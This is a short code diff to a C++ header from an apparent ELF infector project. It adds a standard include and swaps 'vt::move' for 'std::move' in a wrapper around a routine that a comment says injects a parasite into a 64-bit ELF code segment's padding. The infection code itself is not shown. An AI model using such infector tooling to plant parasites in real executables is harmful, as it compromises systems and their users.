@@ -1,5 +1,6 @@
 #pragma once
 #include "common/mmap.hh"
+#include <utility>
 
 namespace vt::infector {
 // This algorithm injects a parasite into an 64 bit elf's code segment padding,
@@ -44,7 +45,7 @@ struct PaddingInfect {
   }
   bool operator()(common::Mmap<PROT_READ | PROT_WRITE> host_mapping,
                   common::Mmap<PROT_READ> parasite_mapping) {
-    return padding_infect64(vt::move(host_mapping), vt::move(parasite_mapping));
+    return padding_infect64(std::move(host_mapping), std::move(parasite_mapping));
   }
 };
 
